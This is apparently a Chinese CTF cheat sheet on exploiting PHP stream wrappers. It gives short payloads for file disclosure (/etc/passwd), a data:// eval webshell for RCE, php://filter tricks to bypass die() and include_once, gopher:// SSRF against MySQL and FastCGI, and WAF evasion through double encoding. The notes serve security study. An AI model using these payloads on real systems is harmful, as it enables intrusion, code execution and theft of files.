- [PHP官方文档](https://www.php.net/manual/en/wrappers.php)
- # `php://`
	- 各种编码的加解密
		- ```
		  base64编码，读取文件：
		  php://filter/read=convert.base64-encode/resource=
		  base64解码，读取文件：
		  php://filter/read=convert.base64-decode/resource=
		  base64解码，写入文件：
		  php://filter/write=convert.base64-decode/resource=
		  rot13编码
		  php://filter/write=string.rot13/resource=
		  zlib压缩
		  php://filter/zlib.inflate/resource=
		  ```
	- include无写入文件RCE
	  id:: 63bc02d6-ea56-4c2a-a494-0cb277531dba
		- 通过错误的编码转换，我们可以在文件内容的开头加入某些字符，这样我们就可以在文件的开头写入任意内容，并实现RCE
		- [参考](https://tttang.com/archive/1395/)
		- [Payload生成](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)
		- 如果是`include_once`或者`require_once`那可能要配合 ((636665b7-cd42-4bd2-a685-f5e5cc4f5ec7))
	- 让php崩溃，从而让临时文件留在/tmp中
	  id:: 636665b7-767d-440c-8482-bb5e1dc0933c
		- `php://filter/string.strip_tags/resource=/etc/passwd`
	- 让`include_once`和`require_once`失效：
	  id:: 636665b7-cd42-4bd2-a685-f5e5cc4f5ec7
		- `php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/etc/passwd`
	- isset函数支持php伪协议
	- 绕开死亡`die`
		- 某些题目会在文件的开头加入类似`<?php die();`的内容，让我们无法正常写入webshell, 我们可以使用base64解码或者其他方式破坏掉前面的`die`
		- `php://filter/write=string.strip_tags|convert.base64-decode/resource=`
	- php在解析伪协议时会先urldecode伪协议，所以可以使用二次编码绕过WAF
	  id:: 64673efa-c544-4ad7-9b9b-920b148d0b26
	- 所有filter
		- ```php
		  zlib.*
		  convert.iconv.*
		  string.rot13
		  string.toupper
		  string.tolower
		  string.strip_tags
		  convert.base64-encode
		  convert.base64-decode
		  convert.quoted-printable-encode
		  convert.quoted-printable-decode
		  consumed
		  dechunk
		  ```
- # `data://`
	- 单纯表示某个内容，比如：`data://text/plain,123`读取出来的内容就是`123`
	- include无写入文件RCE
		- `data://text/plain,<?php eval($_POST['data']);?>`
	- base64
		- `data://text/plain;base64,`
- # `gopher://`
  id:: 62f27746-a352-41d4-b76d-63fc1f7c9e4f
	- `gopher://127.0.0.1:9000/_xxx`
		- 其中xxx是（URL编码后的）TCP发送的数据
	- 打SSRF
		- 打无密码MySQL
			- 只需要无密码用户的用户名即可执行任意SQL指令
		- 打FastCGI
			- 只需要一个存在主机上文件的路径就可以执行任意Shell指令
		- 可以打：`mysql, postgresql, fastcgi, redis, smtp, zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache`
	- Payload可以用 ((62f14125-43fc-4da5-b83f-4d56aa1d2157)) 生成
- # `phar://`
	- 读取某个phar压缩包中的文件
	- `phar://a.phar/a.txt`
	- [[CTF/PHP/Phar]]
- # `file://`
	- 表示文件，如`file:///etc/passwd`
- # `dict://`
	- 发送TCP数据，感觉不如`gopher://`
- # `glob://`
	- 读取目录，后面接上Linux的glob表达式
	- {{embed [[CTF/PHP/目录读取]]}}
- 另：
	- java 的`file://`可以读取目录
	- 能用`file://`的地方有时可以不用`file://`, 直接读取
		- 比如`file:///etc/passwd`和`/etc/passwd`
- 其他
	- 有关file_get_contents()函数的一个trick，可以看作是SSRF的一个黑魔法，当PHP的 file_get_contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。
		- ```
		  httpsssss://../../../../../../etc/passwd
		  httpsssss://abc../../../../../../etc/passwd
		  ```
	- 在很多时候伪协议都是支持URL编码的，可以用来绕过关键字检测